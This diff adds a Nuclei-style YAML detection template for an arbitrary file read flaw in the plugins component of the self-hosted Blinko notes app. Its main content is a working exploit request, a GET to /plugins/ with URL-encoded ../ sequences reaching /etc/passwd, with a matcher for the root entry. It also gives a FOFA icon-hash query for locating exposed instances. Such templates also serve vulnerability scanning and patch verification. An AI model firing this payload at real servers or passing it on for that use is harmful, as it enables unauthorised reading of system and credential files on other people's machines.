@@ -1,0 +1,29 @@
+id: blinko-notes-plugins-arbitrary-file-read
+
+info:
+  name: "Blinko笔记plugins组件存在任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    Blinko 是一款支持私有化部署的开源笔记工具，具备 AI 增强搜索功能以帮助用户高效记录与检索灵感，同时保障数据自主权。
+
+    fofa: icon_hash="-1446811182" || icon_hash="-717082057"
+  tags: Blinko
+
+http:
+- raw:
+  - |
+    GET /plugins/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: language=zh-cn; language=zh-cn
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - "root:[x*]:0:0"
